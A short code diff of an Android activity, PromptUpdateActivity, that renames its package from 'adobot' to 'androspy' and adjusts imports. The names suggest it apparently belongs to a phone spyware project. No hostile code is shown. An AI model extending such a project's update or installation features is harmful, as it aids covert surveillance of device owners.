@@ -1,11 +1,11 @@
-package buddy.ap.com.adobot;
+package buddy.ap.com.androspy;
 
-import android.app.Activity;
+import android.content.ComponentName;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.Environment;
-import android.os.PersistableBundle;
 import android.support.v7.app.AppCompatActivity;
 import android.view.View;
 import android.view.View.OnClickListener;
@@ -37,5 +37,4 @@ public class PromptUpdateActivity extends AppCompatActivity {
         intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // without this flag android returned a intent error!
         getApplicationContext().startActivity(intent);
     }
-
 }
